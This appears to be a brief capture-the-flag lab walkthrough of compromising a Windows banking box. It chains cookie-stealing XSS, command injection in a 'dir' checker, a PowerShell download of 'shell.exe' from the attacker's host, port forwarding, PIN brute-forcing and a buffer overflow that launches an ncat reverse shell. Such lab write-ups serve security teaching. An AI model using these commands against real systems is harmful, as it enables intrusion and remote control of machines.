Runing the nmap scripts we get 4 ports open: 80 ( Web ), 443 ( SSL ) , 445 ( SAMBA ) and 3306 ( MYSQL )

Attacking the web ( port 80 )
We get a bitcoin transfer wallet with which we can create an account. Let's use test:test. 
When we are logged in we get a transfer form, to send money from one use to another. But when we proceed with that transfer an interesting message pops up `Transfer on hold. An admin will review it within a minute.` I wonder if we can XSS and steal the admin credentials. 
Let's try to exploit that form. Inject the payload from `admin.cookie` in all the possible fields and than wait for the response.
And we got the first set of credentials.

Attacking the backendchecker ( port 80 )
Well, as an admin we have access to a backend door checker, but we can only do `dir` cmd over localhost. When we try stuff like `dir & whoami` it doesn't give the error with "The only cmd that you can use" so we can pass multiple things against this.
Using the idea from the first part of the exploit, we get an XSS RCE working and got the user shell.

Heading to root.
We see that `bankv2` is running on the box and we also have the `bankv2.exe`. Let's try and download it.
Switch to metasploit using `(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.47:8000/shell.exe", "C:\Users\Cortin\Desktop\shell.exe")` to download the payload. 
It seems we can't download this file. Looking over the listeners, using `netstat -an` port 910 is open only for local. Let's portforword it `portfwd add -l 910 -r 10.10.10.154 -p 910` and than connect using `telnet localhost 910`
Bruteforce it using `bruteforce.py` and the the pin 0021  
Overflow it with `0000000000000000000000000000testC:\\Users\Cortin\Desktop\ncat.exe 10.10.14.47 1337 -e cmd.exe` ( 32 characters for overflow and than the command that you should execute ).
